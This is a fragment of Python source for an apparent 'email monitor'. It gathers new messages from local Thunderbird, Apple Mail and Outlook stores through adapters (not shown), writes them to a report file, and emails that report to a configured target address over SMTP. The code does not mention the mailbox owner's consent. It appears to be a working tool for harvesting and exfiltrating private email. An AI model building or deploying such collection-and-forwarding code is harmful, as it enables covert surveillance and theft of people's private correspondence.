class EmailNotifier:
    """Handles dispatching the output report via SMTP."""

    def __init__(self):
        self.host = Config.SMTP_HOST
        self.port = Config.SMTP_PORT
        self.user = Config.SMTP_USER
        self.password = Config.SMTP_PASSWORD
        self.use_tls = Config.SMTP_USE_TLS
        self.target_email = Config.TARGET_EMAIL
        self.sender_email = Config.SENDER_EMAIL

    def send_report(self, file_path: str) -> bool:
        if not os.path.exists(file_path):
            logger.error(f"Cannot send report; file not found: {file_path}")
            return False

        msg = StdEmailMessage()
        msg["Subject"] = f"Email Monitor Report - {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
        msg["From"] = self.sender_email
        msg["To"] = self.target_email
        msg.set_content("Please find attached the latest collected email monitoring report.")

        try:
            with open(file_path, "rb") as f:
                file_data = f.read()
                file_name = os.path.basename(file_path)

            msg.add_attachment(file_data, maintype="text", subtype="plain", filename=file_name)
        except Exception as e:
            logger.error(f"Failed to attach report file: {e}")
            return False

        try:
            logger.info(f"Connecting to SMTP server {self.host}:{self.port}...")
            if self.use_tls:
                server = smtplib.SMTP(self.host, self.port)
                server.starttls()
            else:
                server = smtplib.SMTP_SSL(self.host, self.port)

            if self.user and self.password:
                server.login(self.user, self.password)

            server.send_message(msg)
            server.quit()
            logger.info(f"Successfully sent monitoring report email to {self.target_email}")
            return True
        except Exception as e:
            logger.error(f"Failed to send email via SMTP: {e}")
            return False


class EmailMonitorService:
    """Orchestrates collection, persistence, state tracking, and notification."""

    def __init__(self, adapters: List[BaseClientAdapter]):
        self.adapters = adapters
        self.state_manager = StateManager(Config.STATE_FILE)
        self.notifier = EmailNotifier()

    def run(self) -> None:
        logger.info("Starting email monitoring execution cycle...")
        new_messages: List[EmailMessageModel] = []

        for adapter in self.adapters:
            if adapter.is_available():
                logger.info(f"Running adapter: {adapter.__class__.__name__}")
                try:
                    for message in adapter.fetch_messages():
                        if not self.state_manager.is_processed(message.message_id):
                            new_messages.append(message)
                            self.state_manager.mark_processed(message.message_id)
                except Exception as e:
                    logger.error(f"Error executing adapter {adapter.__class__.__name__}: {e}")
            else:
                logger.info(f"Adapter unavailable: {adapter.__class__.__name__}")

        # Write or overwrite the local output file with current session results
        self._write_output_file(new_messages)

        # Save updated execution state
        self.state_manager.save_state()

        # Send report via email
        if new_messages:
            self.notifier.send_report(Config.OUTPUT_FILE)
        else:
            logger.info("No new messages found. Skipping email notification.")

        logger.info("Email monitoring execution cycle completed.")

    def _write_output_file(self, messages: List[EmailMessageModel]) -> None:
        directory = os.path.dirname(Config.OUTPUT_FILE)
        try:
            if directory and not os.path.exists(directory):
                os.makedirs(directory, exist_ok=True)

            with open(Config.OUTPUT_FILE, "w", encoding="utf-8") as f:
                if not messages:
                    f.write("No new messages found during this execution cycle.\n")
                else:
                    for msg in messages:
                        f.write(str(msg) + "\n")
            logger.info(f"Successfully wrote {len(messages)} new message(s) to {Config.OUTPUT_FILE}")
        except OSError as e:
            logger.error(f"Failed to write output file to {Config.OUTPUT_FILE}: {e}")


def main():
    adapters: List[BaseClientAdapter] = [
        ThunderbirdAdapter(),
        AppleMailAdapter(),
        OutlookAdapter()
    ]

    service = EmailMonitorService(adapters)
    service.run()


if __name__ == "__main__":
    main()

